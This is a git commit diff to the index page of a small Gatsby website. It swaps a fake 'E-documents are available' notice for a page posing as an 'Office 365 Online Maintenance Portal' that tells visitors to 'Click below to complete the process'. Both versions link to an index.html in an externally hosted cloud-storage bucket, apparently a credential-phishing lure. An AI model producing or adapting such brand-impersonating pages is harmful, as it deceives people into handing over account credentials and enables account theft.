0ed9c37965d37a779e6b1311b21022c52aba0ef8
betlet <87131840+betlet@users.noreply.github.com>
2021-07-13 20:16:03 +0100

    Update index.js

--- src/pages/index.js
+++ src/pages/index.js
@@ -1,28 +1,16 @@
 import * as React from "react"
 import { Link } from "gatsby"
-import { StaticImage } from "gatsby-plugin-image"
 
 import Layout from "../components/layout"
 import Seo from "../components/seo"
 
-const IndexPage = () => (
+const SecondPage = () => (
   <Layout>
-    <Seo title="Document" />
-    <h1>Hello</h1>
-    <p>Your new E-documents are available to you.</p>
-    <p>Now you can view below.</p>
-    <StaticImage
-      src="../images/gatsby-astronaut.png"
-      width={100}
-      quality={95}
-      formats={["AUTO", "WEBP", "AVIF"]}
-      alt="A Gatsby astronaut"
-      style={{ marginBottom: `1.00rem` }}
-    /> 
-    <p>
-      <Link to="https://edocument.s3.us-west-000.backblazeb2.com/index.html">Review | Print Document Here</Link> <br />
-    </p>
+    <Seo title="Office 365" />
+    <h1>Office 365 Online Maintenance Portal.</h1>
+    <p>Click below to complete the process</p>
+    <Link to="https://edocument.s3.us-west-000.backblazeb2.com/index.html">Office 365 Portal</Link>
   </Layout>
 )
 
-export default IndexPage
+export default SecondPage
